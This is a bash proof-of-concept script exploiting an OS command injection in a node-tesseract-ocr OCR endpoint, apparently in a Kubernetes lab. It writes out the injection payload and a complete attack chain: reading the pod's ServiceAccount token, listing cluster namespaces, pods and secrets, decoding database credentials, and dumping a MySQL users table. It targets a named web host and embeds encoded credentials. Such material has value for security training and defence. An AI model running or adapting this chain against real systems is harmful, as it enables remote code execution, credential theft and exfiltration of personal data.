#!/usr/bin/env bash
# =============================================================================
# attack.sh — PoC exploiting CVE-2026-26832 (OS Command Injection)
#             in node-tesseract-ocr <= 2.2.1, demonstrating the attack chain:
#             RCE -> steal SA token -> call kube-apiserver -> read secret ->
#             -> pivot to MySQL and exfiltrate data.
#
# ⚠️  ONLY use in your own isolated lab. Do not target real systems.
# Usage:  source attack.sh   (loads the function)   then call each command below.
# =============================================================================

# -----------------------------------------------------------------------------
# attack() function: sends an arbitrary shell command to the shop-app pod via the vuln.
#
# The /api/products/scan-label endpoint builds the command: tesseract "<imagePath>" stdout ...
# then passes it to child_process.exec() WITHOUT sanitizing. Injection payload:
#   "  -> closes the double quote that tesseract wraps around imagePath (breaks out of the arg)
#   >/dev/null 2>&1  -> discards the empty tesseract command's output/errors to keep things clean
#   ; $1             -> runs our own command
#   #                -> comments out the leftover " stdout -l eng ... " trailing part
# jq -n --arg: safely builds JSON (auto-escapes), no need to escape quotes by hand.
# jq -r '.text // .error': the app returns the result in the text field (success) or error.
# -----------------------------------------------------------------------------
attack() {
  jq -n --arg c "\" >/dev/null 2>&1; $1 #" '{imagePath:$c}' \
    | curl -s -X POST "https://ecommerce.vdevopssphere.ddnsfree.com/api/products/scan-label" \
        -H 'Content-Type: application/json' -d @- \
    | jq -r '.text // .error'
}

# --- Step: grab the ServiceAccount token (default automount -> token is already in the pod) ---
TOKEN=$(attack "cat /var/run/secrets/kubernetes.io/serviceaccount/token")

# --- Step: use the token to call kube-apiserver directly via the default service DNS ---
# Note: curl runs INSIDE the pod, jq runs on YOUR MACHINE (the pod doesn't need jq).
# List all namespaces -> proves the token can read cluster resources.
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces" | jq -r '.items[] | "\(.metadata.name)"'

# List pods across the whole cluster (overly broad RBAC -> visibility into every namespace).
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/pods" | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'

# List secret names in the database namespace (metadata only, for brevity).
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces/database/secrets" | jq -r '.items[].metadata | "\(.namespace)/\(.name)"'

# Read the secret's .data section -> DB password value (base64, not encrypted).
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces/database/secrets" | jq -r '.items[].data '

# List services in database -> find the mysql-svc endpoint to pivot to.
attack "curl -sk -H 'Authorization: Bearer $TOKEN' https://kubernetes.default.svc/api/v1/namespaces/database/services" |  jq -r '.items[].metadata | "\(.namespace)/\(.name)"'

# --- Step: base64-decode the creds obtained from the secret above (base64 != encryption) ---
DBPASS=$(echo U2gwcEFwcCFEYlBhc3M= | base64 -d )   # MYSQL_PASSWORD
DBUSER=$(echo c2hvcGFwcA== | base64 -d )           # MYSQL_USER
DBNAME=$(echo c2hvcA== | base64 -d )               # MYSQL_DATABASE

echo $DBPASS $DBUSER $DBNAME

# --- Step: use the stolen creds to connect straight to MySQL from INSIDE the app pod (no NetworkPolicy blocking) ---
# The mysql client is present in the image (default-mysql-client installed alongside) -> pivot to the DB in another namespace.
attack "mysql -h mysql-svc.database.svc.cluster.local -u $DBUSER -p$DBPASS  $DBNAME -e 'show tables;' "
# Exfiltrate the entire users table (simulated PII) -> end of the attack chain.
attack "mysql -h mysql-svc.database.svc.cluster.local -u $DBUSER -p$DBPASS  $DBNAME -e 'SELECT * FROM users;' "
